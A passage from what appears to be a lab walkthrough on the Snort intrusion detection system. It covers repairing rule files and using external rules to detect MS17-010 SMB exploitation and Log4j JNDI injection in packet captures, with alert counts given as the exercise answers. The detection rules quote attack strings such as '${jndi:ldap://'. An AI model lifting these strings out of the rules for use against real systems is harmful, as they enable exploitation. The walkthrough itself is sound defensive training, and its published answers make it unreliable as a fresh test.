      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```

*16*


Fix the syntax error in local-2.rules file and make it work smoothly.

What is the number of the detected packets?
Don't forget the ports! (any)

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-2.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-2.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-2.rules -r mx-1.pcap -A console

Action Stats:
     Alerts:           68 ( 59.130%)
     Logged:           68 ( 59.130%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          115 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```

*68*


Fix the syntax error in local-3.rules file and make it work smoothly.

What is the number of the detected packets?
SIDs should be unique!

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-3.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-3.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-3.rules -r mx-1.pcap -A console

===============================================================================
Action Stats:
     Alerts:           87 ( 75.652%)
     Logged:           87 ( 75.652%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          115 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```


*87*


Fix the syntax error in local-4.rules file and make it work smoothly.

What is the number of the detected packets?
Semicolons matters!

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-4.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-4.rules 

# -------------------
# LOCAL RULES
# -------------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert icmp any any -> any any (msg:"ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg:"HTTPX Packet Found"; sid:1000002; rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-4.rules -r mx-1.pcap -A console

===============================================================================
Action Stats:
     Alerts:           90 ( 78.261%)
     Logged:           90 ( 78.261%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          115 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting


```

*90*



Fix the syntax error in local-5.rules file and make it work smoothly.

What is the number of the detected packets?
Direction and colons! (->)

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-5.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-5.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert icmp any any <> any any (msg:"ICMP Packet Found";sid:1000001; rev:1;)
alert icmp any any -> any any (msg:"Inbound ICMP Packet Found";sid:1000002; rev:1;)
alert tcp any any -> any 80,443 (msg:"HTTPX Packet Found";sid:1000003; rev:1;)


root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-5.rules -r mx-1.pcap -A console

===============================================================================
Action Stats:
     Alerts:          155 (134.783%)
     Logged:          155 (134.783%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          115 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting


```

*155*


Fix the logical error in local-6.rules file and make it work smoothly to create alerts.

What is the number of the detected packets?
Case sensitivity matters! Use the capitals or nocase!

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-6.rules 

# -------------------
# LOCAL RULES
# -------------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|67 65 74|"; sid: 100001;

repair

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-6.rules 

# -------------------
# LOCAL RULES
# -------------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any any <> any 80  (msg: "GET Request Found"; content:"GET"; sid: 100001; rev:1;

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-6.rules -r mx-1.pcap -A console

===============================================================================
Action Stats:
     Alerts:            2 (  1.739%)
     Logged:            2 (  1.739%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          115 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```

*2*


Fix the logical error in local-7.rules file and make it work smoothly to create alerts.

What is the name of the required option:
 Rules without messages doesn't make sense!

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-7.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any any <> any 80  (content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)

repair

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-7.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-7.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any any <> any 80  (msg:"Found it";content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-7.rules -r mx-1.pcap -A console

===============================================================================
Action Stats:
     Alerts:            9 (  7.826%)
     Logged:            9 (  7.826%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          115 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```


*msg*

###  Using External Rules (MS17-010) 

Let's use external rules to fight against the latest threats!



Navigate to the task folder.

Use the given pcap file.

Use the given rule file (local.rules) to investigate the ms1710 exploitation.

What is the number of detected packets?

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
 Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-7 (MS17-10)'/
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# ls
local-1.rules  local.rules  ms-17-010.pcap

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.




alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; sid: 2094284; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$"; sid:2094285; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "NTLMSSP";sid: 2094286; rev: 2;) 
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "WindowsPowerShell";sid: 20244223; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "ADMIN$";sid:20244224; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$";sid: 20244225; rev:3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 20244226; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 209462812; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "samr"; sid: 209462813; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "browser"; sid: 209462814; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established;content: "epmapper";sid: 209462815; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "eventlog"; sid: 209462816; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "/root/smbshare"; sid: 20242290; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "\\PIPE"; sid: 20242291; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "smbshare"; sid: 20242292; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "srvsvc"; sid: 20242293; rev: 2;)
alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB3|00 00 00 00|"; depth:9; offset:4; byte_extract:2,26,TotalDataCount,relative,little; byte_test:2,>,TotalDataCount,20,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,blog.talosintelligence.com/2017/05/wannacry.html; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:41978; rev:5;)
alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB|A0 00 00 00 00|"; depth:9; offset:4; content:"|01 00 00 00 00|"; within:5; distance:59; byte_test:4,>,0x8150,-33,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:42944; rev:2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; reference: ExploitDatabase (ID’s - 42030, 42031, 42315); priority: 10; sid: 2094284; rev: 2;)


root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# sudo snort -c local.rules -r ms-17-010.pcap -A console

===============================================================================
Action Stats:
     Alerts:        25154 ( 53.916%)
     Logged:        25154 ( 53.916%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:        46654 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```

*25154*


Clear the previous log and alarm files.

Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.

What is the number of detected packets?
The "content" option will help you to filter the payload.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# cat local-1.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$"; sid:2094285; rev: 3;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# sudo snort -c local-1.rules -r ms-17-010.pcap -A console

===============================================================================
Action Stats:
     Alerts:           12 (  0.026%)
     Logged:           12 (  0.026%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:        46654 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```

*12*


Investigate the log/alarm files.

What is the requested path?
		
		Ends with "\IPC$"

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# sudo snort -c local.rules -r ms-17-010.pcap -A console -dev -l .

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# ls -lah
total 71M
drwxrwxr-x  2 ubuntu ubuntu 4.0K Dec  7 02:38 .
drwx------ 10 ubuntu ubuntu 4.0K Feb  2  2022 ..
-rw-rw-r--  1 ubuntu ubuntu  269 Dec  7 02:33 local-1.rules
-rw-rw-r--  1 ubuntu ubuntu 4.1K Dec 24  2021 local.rules
-rw-rw-r--  1 ubuntu ubuntu  37M Dec 24  2021 ms-17-010.pcap
-rw-------  1 root   root    35M Dec  7 02:40 snort.log.1670380683

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# sudo snort -c local-1.rules -r ms-17-010.pcap -A console -dev

WARNING: No preprocessors configured for policy 0.
05/18-08:12:07.219643 00:19:BB:4F:4C:D8 -> 00:25:B3:F5:FA:74 type:0x800 len:0xB0
192.168.116.138:445 -> 192.168.116.149:49368 TCP TTL:128 TOS:0x0 ID:251 IpLen:20 DgmLen:162 DF
***AP*** Seq: 0x22312580  Ack: 0xFF7320A3  Win: 0x100  TcpLen: 20
00 00 00 76 FF 53 4D 42 73 00 00 00 00 98 01 20  ...v.SMBs...... 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 2F 4B  ............../K
00 08 C5 5E 03 FF 00 76 00 00 00 4D 00 57 69 6E  ...^...v...M.Win
64 6F 77 73 20 37 20 45 6E 74 65 72 70 72 69 73  dows 7 Enterpris
65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
61 63 6B 20 31 00 57 69 6E 64 6F 77 73 20 37 20  ack 1.Windows 7 
45 6E 74 65 72 70 72 69 73 65 20 36 2E 31 00 54  Enterprise 6.1.T
45 53 54 44 4F 4D 41 49 4E 00                    ESTDOMAIN.

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/18-08:12:07.219861  [**] [1:2094285:3] Exploit Detected! [**] [Priority: 0] {TCP} 192.168.116.149:49368 -> 192.168.116.138:445
05/18-08:12:07.219861 00:25:B3:F5:FA:74 -> 00:19:BB:4F:4C:D8 type:0x800 len:0x83
192.168.116.149:49368 -> 192.168.116.138:445 TCP TTL:128 TOS:0x0 ID:575 IpLen:20 DgmLen:117 DF
***AP*** Seq: 0xFF7320A3  Ack: 0x223125FA  Win: 0xFF  TcpLen: 20
00 00 00 49 FF 53 4D 42 75 00 00 00 00 18 01 20  ...I.SMBu...... 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 2F 4B  ............../K
00 08 C5 5E 04 FF 00 00 00 00 00 01 00 1C 00 00  ...^............
5C 5C 31 39 32 2E 31 36 38 2E 31 31 36 2E 31 33  \\192.168.116.13
38 5C 49 50 43 24 00 3F 3F 3F 3F 3F 00           8\IPC$.?????.

find:IPC

\\192.168.116.138\IPC$

```

	*\\192.168.116.138\IPC$*


What is the CVSS v2 score of the MS17-010 vulnerability?
External search will help you to find the score!

https://www.cvedetails.com/cve/CVE-2017-0144/

```
CVSS Score

9.3

Confidentiality Impact

Complete (There is total information disclosure, resulting in all system files being revealed.)

Integrity Impact

Complete (There is a total compromise of system integrity. There is a complete loss of system protection, resulting in the entire system being compromised.)

Availability Impact

Complete (There is a total shutdown of the affected resource. The attacker can render the resource completely unavailable.)

Access Complexity

Medium (The access conditions are somewhat specialized. Some preconditions must be satistified to exploit)

Authentication

Not required (Authentication is not required to exploit the vulnerability.)

Gained Access

None

Vulnerability Type(s)

Execute Code
```

*9.3*

###  Using External Rules (Log4j) 

Let's use external rules to fight against the latest threats!



Navigate to the task folder.

Use the given pcap file.

Use the given rule file (local.rules) to investigate the log4j exploitation.

What is the number of detected packets?

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
 Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-8 (Log4j)'/
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# ls
local-1.rules  local.rules  log4j.pcap

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# sudo snort -c local.rules -r log4j.pcap -A console

===============================================================================
Action Stats:
     Alerts:           26 (  0.057%)
     Logged:           26 (  0.057%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            4
      Alert:            0
Verdicts:
      Allow:        45891 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
+-----------------------[filtered events]--------------------------------------
| gen-id=1      sig-id=21003728   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
| gen-id=1      sig-id=21003731   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
| gen-id=1      sig-id=21003730   type=Limit     tracking=dst count=1   seconds=3600 filtered=2
Snort exiting

```

*26*



Investigate the log/alarm files.

How many rules were triggered?.
You can investigate the alarm file with CLI commands (cat, grep). OR, you can read the snort output summary.

```

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.


alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:ldap://"; fast_pattern:only; flowbits:set, fox.apachelog4j.rce; priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003726; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; pcre:"/\$\{jndi\:(rmi|ldaps|dns)\:/"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003728; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; content:!"ldap://"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, twitter.com/stereotype32/status/1469313856229228544; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003730; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228)"; flow:established, to_server; content:"%7bjndi:"; nocase; fast_pattern; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003731; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header"; flow:established, to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003732; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI"; flow:established,to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003733; rev:1;) 

# Better and stricter rules, also detects evasion techniques
alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header (strict)"; flow:established,to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Hi"; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003734; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI (strict)"; flow:established, to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Ui"; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003735; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in Client Body (strict)"; flow:to_server; content:"${"; http_client_body; fast_pattern; content:"}"; http_client_body; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Pi"; flowbits:set, fox.apachelog4j.rce.strict; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-12; metadata:ids suricata; priority:3; sid:21003744; rev:1;)

===============================================================================
Run time for packet processing was 7.1666 seconds
Snort processed 45891 packets.
Snort ran for 0 days 0 hours 0 minutes 7 seconds
   Pkts/sec:         6555
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       2600960
  Bytes in mapped regions (hblkhd):      17784832
  Total allocated space (uordblks):      2226448
  Total free space (fordblks):           374512
  Topmost releasable block (keepcost):   66912
===============================================================================
Packet I/O Totals:
   Received:        45891
   Analyzed:        45891 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:        45891 (100.000%)
       VLAN:           10 (  0.022%)
        IP4:        45981 (100.196%)
       Frag:            4 (  0.009%)
       ICMP:         5742 ( 12.512%)
        UDP:         1769 (  3.855%)
        TCP:        38378 ( 83.629%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:           90 (  0.196%)
    GRE Eth:           21 (  0.046%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:           90 (  0.196%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:          174 (  0.379%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:        45891
===============================================================================
Action Stats:
     Alerts:           26 (  0.057%)
     Logged:           26 (  0.057%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            4
      Alert:            0
Verdicts:
      Allow:        45891 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
+-----------------------[filtered events]--------------------------------------
| gen-id=1      sig-id=21003728   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
| gen-id=1      sig-id=21003731   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
| gen-id=1      sig-id=21003730   type=Limit     tracking=dst count=1   seconds=3600 filtered=2
Snort exiting


```


*4*


Investigate the log/alarm files.

What are the first six digits of the triggered rule sids?
Starts with 21
*210037*


Clear the previous log and alarm files.

Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.

What is the number of detected packets?
The "dsize" option will help you to filter the payload size.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# nano local-1.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# cat local-1.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any any (msg:"Packet size 770 and 855"; dsize:770<>855; sid:1000001;)


root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# sudo snort -c local-1.rules -r log4j.pcap -A console

===============================================================================
Action Stats:
     Alerts:           41 (  0.089%)
     Logged:           41 (  0.089%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:        45891 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```

*41*


